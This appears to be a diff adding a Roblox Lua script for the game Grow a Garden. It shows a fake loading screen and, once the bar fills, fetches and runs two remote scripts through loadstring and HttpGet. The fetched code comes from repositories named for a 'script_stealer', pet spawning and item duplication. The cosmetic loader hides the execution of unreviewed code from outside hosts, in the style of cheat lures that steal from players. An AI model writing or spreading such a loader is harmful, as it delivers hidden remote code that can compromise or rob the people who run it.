@@ -1,0 +1,84 @@
+-- Create the ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "CrashWaitingUI"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Transparent fullscreen Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.Position = UDim2.new(0, 0, 0, 0)
+frame.BackgroundTransparency = 1
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+-- Loading message
+local textLabel = Instance.new("TextLabel")
+textLabel.Text = "**WAITING FOR SYPHINX SCRIPT TO LOAD..."
+textLabel.Size = UDim2.new(1, 0, 0.1, 0)
+textLabel.Position = UDim2.new(0, 0, 0.4, 0)
+textLabel.TextScaled = true
+textLabel.Font = Enum.Font.SourceSansBold
+textLabel.TextColor3 = Color3.new(1, 1, 1)
+textLabel.BackgroundTransparency = 1
+textLabel.Parent = frame
+
+-- Spinner icon
+local loadingImage = Instance.new("ImageLabel")
+loadingImage.Size = UDim2.new(0, 50, 0, 50)
+loadingImage.Position = UDim2.new(0.5, -25, 0.52, 0)
+loadingImage.BackgroundTransparency = 1
+loadingImage.Image = "rbxassetid://7733960981"
+loadingImage.Parent = frame
+
+-- Loading bar background
+local barBackground = Instance.new("Frame")
+barBackground.Size = UDim2.new(0.4, 0, 0.025, 0)
+barBackground.Position = UDim2.new(0.3, 0, 0.6, 0)
+barBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+barBackground.BorderSizePixel = 0
+barBackground.Parent = frame
+
+-- Loading bar fill
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.Position = UDim2.new(0, 0, 0, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBackground
+
+-- Animate spinner
+local runService = game:GetService("RunService")
+local angle = 0
+runService.RenderStepped:Connect(function(deltaTime)
+    angle = angle + 180 * deltaTime
+    loadingImage.Rotation = angle % 360
+end)
+
+-- Animate loading bar over 10 seconds
+local TweenService = game:GetService("TweenService")
+local goal = { Size = UDim2.new(1, 0, 1, 0) }
+local tweenInfo = TweenInfo.new(20, Enum.EasingStyle.Linear)
+local tween = TweenService:Create(barFill, tweenInfo, goal)
+tween:Play()
+
+-- Fade-out and execute scripts when complete
+tween.Completed:Connect(function()
+    for t = 0, 1, 0.05 do
+        textLabel.TextTransparency = t
+        textLabel.TextStrokeTransparency = t
+        loadingImage.ImageTransparency = t
+        barBackground.BackgroundTransparency = t
+        barFill.BackgroundTransparency = t
+        wait(0.05)
+    end
+    screenGui:Destroy()
+    
+    -- Execute the first script
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Letsbegin2/growagarden.script_stealer.fruit-player-dupe.pets-schekles/refs/heads/main/Petspawnerscriptss"))()
+    
+    -- Execute the second script
+    local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+Spawner.Load()
+end)
